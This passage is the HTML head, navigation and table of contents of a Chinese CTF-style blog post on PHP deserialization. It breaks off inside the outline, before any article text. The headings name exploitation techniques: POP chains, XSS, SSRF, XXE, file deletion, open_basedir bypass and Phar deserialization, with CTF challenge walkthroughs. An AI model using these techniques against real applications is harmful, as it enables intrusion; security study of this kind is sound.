<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"twe1v3.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="PHP反序列化的学习总结，还有实践总结嗷QWQ">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP反序列化">
<meta property="og:url" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="TWe1v3">
<meta property="og:description" content="PHP反序列化的学习总结，还有实践总结嗷QWQ">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221006202111066.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221018211456021-16672739578731.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221018214636570-16672739578743.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221019011016911-16672739578732.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221019011242914-16672739578744.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16-16672739578745.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/f470fdddc476471d85f438538e078165-16672739578746.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/0bd047f6a1934f67ba766f9caead2a7e-16672739578747.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_19,color_FFFFFF,t_70,g_se,x_16-16672739578748.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/9c463254527f22878a51271db820c6a4-16672739578749.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/87f41bb0c1b7c7ff829dcbf4e1bdd035-166727395787410.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/4bed8c444b5d6640cfde958fa1b83753-166727395787411.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221007152134587-166727395787412.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221007150717433-166727395787413.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221007234558245-166727395787414.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221008000647522-166727395787415.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221008002817077-166727395787416.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221008212336541-166727395787417.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221009185109443-166727395787418.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988659_622b0d7380818dab56a63-166727395787419.jpeg">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988663_622b0d779748192aba6f7-166727395787420.jpeg">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988665_622b0d79304714550f427-166727395787421.jpeg">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988666_622b0d7a2a04733d2da9c-166727395787422.jpeg">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988667_622b0d7b189aa37924788-166727395787423.jpeg">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988668_622b0d7c24506b56b24cc-166727395787424.jpeg">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988669_622b0d7d70e697142e89d-166727395787425.jpeg">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988670_622b0d7ecd9a84139855d-166727395787426.jpeg">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988672_622b0d80327a70a064145-166727395787427.jpeg">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988673_622b0d81b3576c202ffb5-166727395787428.jpeg">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988675_622b0d835c272ae8697f2-166727395787429.jpeg">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988677_622b0d854159ffbe9883d-166727395787430.jpeg">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988680_622b0d88d2b3473a44731-166727395787431.jpeg">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988683_622b0d8b6fba70304dd15-166727395787432.jpeg">
<meta property="og:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988684_622b0d8cd166d59b7b4d2-166727395787433.jpeg">
<meta property="article:published_time" content="2022-11-01T03:29:01.527Z">
<meta property="article:modified_time" content="2022-11-01T03:42:34.888Z">
<meta property="article:author" content="TWe1v3">
<meta property="article:tag" content="PHP">
<meta property="article:tag" content="反序列化">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221006202111066.png">


<link rel="canonical" href="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":"","permalink":"http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","path":"2022/11/反序列化漏洞/","title":"PHP反序列化"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>PHP反序列化 | TWe1v3</title>
  





<script src="/lib/fireworks.js"></script>
  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">TWe1v3</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>文章标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>文章分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>时间轴</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于TWe1v3</a></li><li class="menu-item menu-item-friendlink"><a href="/friendlink/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text"> 反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.1.</span> <span class="nav-text"> PHP类和对象详解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80-php%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 一、PHP类和对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C-%E7%B1%BB%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="nav-number">1.1.2.</span> <span class="nav-text"> 二、类的属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89-%E7%B1%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">1.1.3.</span> <span class="nav-text"> 三、类的方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E5%92%8C%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.4.</span> <span class="nav-text"> 四、构造函数和析构函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%94-static%E9%9D%99%E6%80%81%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">1.1.5.</span> <span class="nav-text"> 五、Static静态关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AD-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="nav-number">1.1.6.</span> <span class="nav-text"> 六、访问控制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%83-%E5%AF%B9%E8%B1%A1%E7%BB%A7%E6%89%BF"><span class="nav-number">1.1.7.</span> <span class="nav-text"> 七、对象继承</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AB-%E9%87%8D%E8%BD%BD"><span class="nav-number">1.1.8.</span> <span class="nav-text"> 八、重载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%81-%E5%AF%B9%E8%B1%A1%E6%AF%94%E8%BE%83"><span class="nav-number">1.1.9.</span> <span class="nav-text"> 十、对象比较</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.2.</span> <span class="nav-text"> 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80-%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="nav-number">1.2.1.</span> <span class="nav-text"> 一、基本知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#~%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.2.1.1.</span> <span class="nav-text"> ~类和对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#~%E5%8F%98%E9%87%8F%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="nav-number">1.2.1.2.</span> <span class="nav-text"> ~变量的属性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#~%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.2.1.3.</span> <span class="nav-text"> ~反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#json_encode"><span class="nav-number">1.2.1.3.1.</span> <span class="nav-text"> json_encode()</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8F%82%E6%95%B0"><span class="nav-number">1.2.1.3.1.1.</span> <span class="nav-text"> 参数：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#serialize"><span class="nav-number">1.2.1.3.2.</span> <span class="nav-text"> serialize()</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8F%82%E6%95%B0value%E8%A6%81%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%88%96%E6%95%B0%E7%BB%84"><span class="nav-number">1.2.1.3.2.1.</span> <span class="nav-text"> 参数：$value:要序列化的对象或数组。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#unserialize"><span class="nav-number">1.2.1.3.3.</span> <span class="nav-text"> unserialize()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA"><span class="nav-number">1.2.1.3.4.</span> <span class="nav-text"> 演示：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.2.</span> <span class="nav-text"> 二、反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-number">1.2.2.1.</span> <span class="nav-text"> 魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#demo"><span class="nav-number">1.2.2.1.1.</span> <span class="nav-text"> Demo</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#demo01-__wokeup"><span class="nav-number">1.2.2.1.2.</span> <span class="nav-text"> Demo01-__wokeup()</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B8%B8%E8%A7%81%E8%80%83%E7%82%B9"><span class="nav-number">1.3.</span> <span class="nav-text"> php反序列化常见考点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pop%E9%93%BE"><span class="nav-number">1.3.1.</span> <span class="nav-text"> POP链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.3.1.1.</span> <span class="nav-text"> 实例复现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E6%BA%90%E7%A0%81"><span class="nav-number">1.3.1.1.1.</span> <span class="nav-text"> 审计源码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#pop%E9%93%BE%E6%9E%84%E9%80%A0"><span class="nav-number">1.3.1.1.2.</span> <span class="nav-text"> POP链构造</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#poc"><span class="nav-number">1.3.1.1.3.</span> <span class="nav-text"> POC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%8E%9F%E7%94%9F%E7%B1%BB%E6%80%BB%E7%BB%93"><span class="nav-number">1.3.2.</span> <span class="nav-text"> PHP原生类总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8errorexception-%E5%86%85%E7%BD%AE%E7%B1%BB%E8%BF%9B%E8%A1%8C-xss"><span class="nav-number">1.3.2.1.</span> <span class="nav-text"> 利用Error&#x2F;Exception 内置类进行 XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#error%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="nav-number">1.3.2.1.1.</span> <span class="nav-text"> Error内置类</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exception%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="nav-number">1.3.2.2.</span> <span class="nav-text"> Exception内置类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#bjdctf-2ndxss%E4%B9%8B%E5%85%89"><span class="nav-number">1.3.2.2.1.</span> <span class="nav-text"> [BJDCTF 2nd]xss之光</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-errorexception-%E5%86%85%E7%BD%AE%E7%B1%BB%E7%BB%95%E8%BF%87%E5%93%88%E5%B8%8C%E6%AF%94%E8%BE%83"><span class="nav-number">1.3.2.3.</span> <span class="nav-text"> 使用 Error&#x2F;Exception 内置类绕过哈希比较</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#error%E7%B1%BB"><span class="nav-number">1.3.2.3.1.</span> <span class="nav-text"> Error类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#exception-%E7%B1%BB"><span class="nav-number">1.3.2.3.2.</span> <span class="nav-text"> Exception 类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98greatphp"><span class="nav-number">1.3.2.3.3.</span> <span class="nav-text"> [2020 极客大挑战]Greatphp</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#soapclient%E7%B1%BB%E6%9D%A5%E8%BF%9B%E8%A1%8Cssrf"><span class="nav-number">1.3.2.4.</span> <span class="nav-text"> SoapClient类来进行SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#soapclient%E7%B1%BB"><span class="nav-number">1.3.2.4.1.</span> <span class="nav-text"> SoapClient类</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-simplexmlelement-%E7%B1%BB%E8%BF%9B%E8%A1%8C-xxe"><span class="nav-number">1.3.2.5.</span> <span class="nav-text"> 使用 SimpleXMLElement 类进行 XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#simplexmlelement%E7%B1%BB"><span class="nav-number">1.3.2.5.1.</span> <span class="nav-text"> SimpleXMLElement类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#suctf2018-homework"><span class="nav-number">1.3.2.5.2.</span> <span class="nav-text"> SUCTF2018-Homework</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-ziparchive-%E7%B1%BB%E6%9D%A5%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6"><span class="nav-number">1.3.2.6.</span> <span class="nav-text"> 使用 ZipArchive 类来删除文件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD"><span class="nav-number">1.3.2.6.1.</span> <span class="nav-text"> 梦里花开牡丹亭</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-%E5%8E%9F%E7%94%9F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%B1%BB"><span class="nav-number">1.3.2.7.</span> <span class="nav-text"> PHP 原生文件操作类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#spl"><span class="nav-number">1.3.2.7.1.</span> <span class="nav-text"> SPL</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E7%9A%84%E7%B1%BB"><span class="nav-number">1.3.2.7.2.</span> <span class="nav-text"> 遍历文件目录的类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#directoryiterator-%E7%B1%BB"><span class="nav-number">1.3.2.7.3.</span> <span class="nav-text"> DirectoryIterator 类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#filesystemiterator-%E7%B1%BB"><span class="nav-number">1.3.2.7.4.</span> <span class="nav-text"> FilesystemIterator 类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#globiterator%E7%B1%BB"><span class="nav-number">1.3.2.7.5.</span> <span class="nav-text"> GlobIterator类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%8F%AF%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E7%B1%BB%E7%BB%95%E8%BF%87-open_basedir"><span class="nav-number">1.3.2.7.6.</span> <span class="nav-text"> 使用可遍历目录类绕过 open_basedir</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8directoryiterator%E7%B1%BB"><span class="nav-number">1.3.2.7.7.</span> <span class="nav-text"> 使用DirectoryIterator类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8filesystemiterator"><span class="nav-number">1.3.2.7.8.</span> <span class="nav-text"> 使用FilesystemIterator</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-globiterator-%E7%B1%BB"><span class="nav-number">1.3.2.7.9.</span> <span class="nav-text"> 使用 GlobIterator 类</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%AF%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%B1%BB"><span class="nav-number">1.3.2.8.</span> <span class="nav-text"> 可读取文件类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#splfileobject-%E7%B1%BB"><span class="nav-number">1.3.2.8.1.</span> <span class="nav-text"> SplFileObject 类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-soezunser"><span class="nav-number">1.3.2.8.2.</span> <span class="nav-text"> 极客大挑战-SoEzUnser</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2021-mar-dasctf-%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9Bez_serialize"><span class="nav-number">1.3.2.8.3.</span> <span class="nav-text"> [2021 MAR DASCTF 明御攻防赛]ez_serialize</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-reflectionmethod-%E7%B1%BB%E8%8E%B7%E5%8F%96%E7%B1%BB%E6%96%B9%E6%B3%95%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF"><span class="nav-number">1.3.2.9.</span> <span class="nav-text"> 使用 ReflectionMethod 类获取类方法的相关信息</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#reflectionmethod"><span class="nav-number">1.3.2.9.1.</span> <span class="nav-text"> ReflectionMethod</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2021-ciscneasy_source"><span class="nav-number">1.3.2.9.2.</span> <span class="nav-text"> [2021 CISCN]easy_source</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.3.3.</span> <span class="nav-text"> Phar反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.3.3.1.</span> <span class="nav-text"> 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#demo-2"><span class="nav-number">1.3.3.2.</span> <span class="nav-text"> Demo</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#trick"><span class="nav-number">1.3.3.3.</span> <span class="nav-text"> Trick</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.3.3.4.</span> <span class="nav-text"> 漏洞条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.3.3.5.</span> <span class="nav-text"> 赛题复现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#mtctf2022%E5%86%B3%E8%B5%9B"><span 